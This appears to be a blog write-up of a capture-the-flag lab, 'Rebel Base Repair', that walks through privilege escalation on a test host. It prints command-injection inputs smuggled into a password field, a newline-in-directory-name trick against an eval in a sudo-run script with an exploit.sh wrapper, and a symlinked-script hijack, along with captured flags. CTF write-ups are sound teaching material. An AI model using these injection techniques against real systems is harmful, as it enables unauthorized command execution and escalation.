<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /etc/resolv.conf
</code></pre></div></div>

<h1 id="rebel-base-repair-httpxnfn8h3kbctf">Rebel Base Repair: http://xn–fn8h3kb.ctf/</h1>

<p><em>index.html</em></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Service status
Service Name 	Status

camera-service 	DOWN
clock-service 	DOWN
management-service 	DOWN
status-service 	DOWN
tool-service 	DOWN
remote-service 	DOWN

Management credentials

User : tech
Password : fixmeplease
</code></pre></div></div>
<h2 id="scannings">Scannings</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># dirs</span>
_tachyon http://xn--fn8h3kb.ctf/
<span class="o">[</span>21:36:23] <span class="o">[</span>FOUND] <span class="k">*</span>Forbidden<span class="k">*</span> Icon directory at: http://xn--fn8h3kb.ctf/icons/

<span class="c">#ip</span>
nmap <span class="nt">-6</span> xn--fn8h3kb.ctf

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2018-05-18 21:51 EDT
Nmap scan report <span class="k">for </span>xn--fn8h3kb.ctf <span class="o">(</span>9000:470:b2b5:cafe:216:3eff:fe50:a269<span class="o">)</span>
Host is up <span class="o">(</span>0.0023s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.11 seconds
</code></pre></div></div>

<h2 id="gaining-access">Gaining Access:</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>

    <span class="o">(</span>status-service<span class="o">)</span> NOPASSWD: /opt/services/status-service/check-status.sh
        <span class="o">(</span>tool-service<span class="o">)</span> NOPASSWD: /opt/tool-service/
</code></pre></div></div>
<h4 id="management-service"><strong>Management-Service</strong></h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /opt/services/management-service/manage.py
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#manage.py: /opt/services/management-service/manage.py
</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">httplib</span>

<span class="k">def</span> <span class="nf">print_menu</span><span class="p">():</span>
        <span class="k">print</span> <span class="s">"######################"</span>
        <span class="k">print</span> <span class="s">"# Management console #"</span>
        <span class="k">print</span> <span class="s">"######################"</span>
        <span class="k">print</span> <span class="s">""</span>
        <span class="k">print</span> <span class="s">"Type '?' or 'help' for help."</span>

<span class="k">def</span> <span class="nf">get_option</span><span class="p">():</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
        <span class="n">invalue</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">invalue</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">menu_loop</span><span class="p">():</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">print_menu</span><span class="p">()</span>
                <span class="n">opt</span> <span class="o">=</span> <span class="n">get_option</span><span class="p">()</span>

                <span class="k">if</span> <span class="ow">not</span> <span class="n">opt</span> <span class="ow">in</span> <span class="n">MENU_OPTIONS</span><span class="p">:</span>
                        <span class="k">print</span> <span class="s">"Invalid option"</span>
                        <span class="k">continue</span>

                <span class="n">MENU_OPTIONS</span><span class="p">[</span><span class="n">opt</span><span class="p">]()</span>

<span class="k">def</span> <span class="nf">change_master</span><span class="p">():</span>
        <span class="k">print</span> <span class="s">"Enter the new master password : "</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">get_option</span><span class="p">()</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
                <span class="k">print</span> <span class="s">"Password must be at most 20 characters"</span>
                <span class="k">return</span>

        <span class="c1"># Prevents command injection
</span>        <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"'"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'fakechroot -s fakeroot /usr/sbin/chroot /opt/services/management-service/ /bin/bash -c </span><span class="se">\'</span><span class="s">/bin/echo "'</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">'" &gt; /master.txt</span><span class="se">\'</span><span class="s">'</span><span class="p">)</span>
        <span class="k">print</span> <span class="s">"Password changed !"</span>

<span class="k">def</span> <span class="nf">ping_website</span><span class="p">():</span>
        <span class="k">print</span> <span class="s">"Enter the domain to test : "</span>
        <span class="n">domain</span> <span class="o">=</span> <span class="n">get_option</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
                <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
                <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span>
                <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
                <span class="k">print</span> <span class="s">"Website is UP !"</span>
        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
                <span class="k">print</span> <span class="s">"Website is DOWN !"</span>

<span class="k">def</span> <span class="nf">help_menu</span><span class="p">():</span>
        <span class="k">print</span> <span class="s">"Options : "</span>
        <span class="k">print</span> <span class="s">" help          : Show the help menu"</span>
        <span class="k">print</span> <span class="s">" change-master : Change the master password of the management console"</span>
        <span class="k">print</span> <span class="s">" ping-website  : Test website connectivity"</span>
        <span class="k">print</span> <span class="s">" exit          : Exit the console"</span>

<span class="n">MENU_OPTIONS</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"help"</span> <span class="p">:</span> <span class="n">help_menu</span><span class="p">,</span>
        <span class="s">"?"</span> <span class="p">:</span> <span class="n">help_menu</span><span class="p">,</span>
        <span class="s">"exit"</span> <span class="p">:</span> <span class="nb">exit</span><span class="p">,</span>
        <span class="s">"change-master"</span> <span class="p">:</span> <span class="n">change_master</span><span class="p">,</span>
        <span class="s">"ping-website"</span> <span class="p">:</span> <span class="n">ping_website</span>
<span class="p">}</span>

<span class="n">menu_loop</span><span class="p">()</span>
</code></pre></div></div>
<p>Great! Here’s a concatenation that we can exploit easily! It comes from the <code class="highlighter-rouge">function change_master</code>.</p>

<p><code class="highlighter-rouge">
os.system('fakechroot -s fakeroot /usr/sbin/chroot /opt/services/management-service/ /bin/bash -c \'/bin/echo "' + password + '" &gt; /master.txt\'')</code><code class="highlighter-rouge">
</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nv">$URL</span> 8787

<span class="c">######################</span>
<span class="c"># Management console #</span>
<span class="c">######################</span>

Type <span class="s1">'?'</span> or <span class="s1">'help'</span> <span class="k">for </span>help.
<span class="o">&gt;</span> change-master
Enter the new master password : 
<span class="o">&gt;</span> <span class="s2">"; ls * "</span>

<span class="c">######################</span>
<span class="c"># Management console #</span>
<span class="c">######################</span>

Type <span class="s1">'?'</span> or <span class="s1">'help'</span> <span class="k">for </span>help.
<span class="o">&gt;</span> change-master
Enter the new master password : 
<span class="o">&gt;</span> <span class="s2">"; cat part1.flag "</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/services/management-service/master.txt<span class="p">;</span> 
FLAG-3788fe305304d7eabf7e92e68e7ca430 <span class="c">#thanks @Robin ;)</span>
</code></pre></div></div>

<p>We have the part1.flag.</p>

<p>Finaly, discovered that the part2.flag was NOT related to the second x-function of that service! The idea is that the <code class="highlighter-rouge">change_master() function</code> is using a <code class="highlighter-rouge">fakechroot</code>. Wich mean that it runs its own lib.c, BUT is still relative to the <code class="highlighter-rouge">tech's filesystem</code></p>

<h4 id="status-service">status-service</h4>

<p><code class="highlighter-rouge">cat /opt/services/status-service/check-status.sh</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Usage check-status.sh [program-id]"</span>
        <span class="nb">exit
</span><span class="k">fi

if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Program ID must not be empty"</span>
        <span class="nb">exit
</span><span class="k">fi


if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Program ID is invalid"</span>
        <span class="nb">exit
</span><span class="k">fi

</span><span class="nv">status</span><span class="o">=</span><span class="k">$(</span><span class="nb">eval</span> <span class="s2">"cat /opt/status/</span><span class="nv">$1</span><span class="s2">.txt"</span><span class="k">)</span>

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$status</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"DOWN"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Service is DOWN"</span>
        <span class="nb">exit
</span><span class="k">fi

if</span> <span class="o">[[</span> <span class="nv">$status</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"UP"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Service is UP"</span>
        <span class="nb">exit
</span><span class="k">fi

</span><span class="nb">echo</span> <span class="s2">"Unknown service status"</span>

</code></pre></div></div>

<p>Ok so the <code class="highlighter-rouge">var status</code> is what <code class="highlighter-rouge">eval</code> returns. Basically, <code class="highlighter-rouge">eval</code> simply runs every lines as different commands. So let’s exploit this! ;)</p>

<p><code class="highlighter-rouge">status=$(eval "cat /opt/status/$1.txt")</code></p>
<h6 id="note">Note:</h6>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span> <span class="s1">'echo woot1
&gt; echo woot2'</span>
woot1
woot2

<span class="c"># what we need's ish...</span>
<span class="nb">eval</span> <span class="s2">"cat /opt/status/a_valid_dir
&gt; run_cmd &gt; out
&gt; '
</span></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp/
<span class="nb">mkdir</span> <span class="s1">'A
 bash launch.sh &gt; out
'</span>
</code></pre></div></div>
<p><strong>exploit.sh</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c">#Pass the command in argument...</span>
<span class="nb">echo</span> <span class="nv">$1</span> <span class="o">&gt;</span> launch.sh
<span class="nb">sudo</span> <span class="nt">-u</span> status-service /opt/services/status-service/check-status.sh <span class="s1">'../../tmp/A
bash launch.sh &gt; out
cat out
</span></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash exploit.sh <span class="s1">'cat /flags/status-service'</span>
FLAG-fa2b89295c01b89572bdce2bb5ada189 <span class="c">#thanks @Ced ! :)</span>
</code></pre></div></div>

<h4 id="tool-service">tool-service</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/tool-service/tool

<span class="c">#!/bin/bash</span>
python /home/tech/tools/tool.py


<span class="nb">cat</span> /home/tech/tools/tool.py

<span class="c">#!/bin/python</span>
from subprocess import call

<span class="k">while </span>True:
  print <span class="s2">"--------"</span>
  print <span class="s2">"Menu"</span>
  print <span class="s2">"--------"</span>
  print <span class="s2">"1) Show hostname"</span>
  print <span class="s2">"2) View open port"</span>
  print <span class="s2">"3) Exit"</span>

  choice <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"&gt; "</span><span class="o">)</span>

  <span class="k">if</span> <span class="s2">"1"</span> <span class="k">in </span>choice:
    call<span class="o">([</span><span class="s2">"hostname"</span><span class="o">])</span>
  <span class="k">elif</span> <span class="s2">"2"</span> <span class="k">in </span>choice:
    call<span class="o">([</span><span class="s2">"netstat"</span>, <span class="s2">"-ntpl"</span><span class="o">])</span>
  <span class="k">else</span>:
    <span class="nb">break</span>
</code></pre></div></div>

<p>Ok, there was a lot things in that script! All we had to do was to keep it simple baby!</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /opt/services/tool-service/tool
tool -&gt; /home/tech/tools/tool.py
<span class="nb">mv</span> ~/tools ~/tools_<span class="p">;</span> <span class="nb">mkdir</span> ~/tools
vim ~/tools/tool.py
</code></pre></div></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>

<span class="n">call</span><span class="p">[</span><span class="s">"cat"</span><span class="p">,</span> <span class="s">"/flags/tool-service"</span><span class="p">]</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> tool-service /opt/tool-service/tool
FLAG-54732c6b417bab535cd2d0086fd72f97 <span class="c">#thanks @srb_ ! :)</span>
</code></pre></div></div>

  </div>
  
</div>

<div class="pagination">
  
    <a class="pagination-item older" href="/page2">Older</a>
  
  
    <span class="pagination-item newer">Newer</span>
  
</div>

    </div>

  </body>
</html>
